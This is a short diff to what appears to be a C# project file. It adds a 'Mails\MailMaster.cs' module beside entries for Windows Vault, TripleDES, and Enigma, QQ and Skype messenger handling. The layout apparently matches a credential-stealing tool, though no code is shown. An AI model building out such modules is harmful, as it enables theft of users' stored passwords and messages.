@@ -67,6 +67,7 @@
     <Compile Include="Helper\Tar.cs" />
     <Compile Include="Helper\TripleDESHelper.cs" />
     <Compile Include="Helper\VaultCli.cs" />
+    <Compile Include="Mails\MailMaster.cs" />
     <Compile Include="Messengers\Enigma.cs" />
     <Compile Include="Messengers\QQ.cs" />
     <Compile Include="Messengers\Skype.cs" />
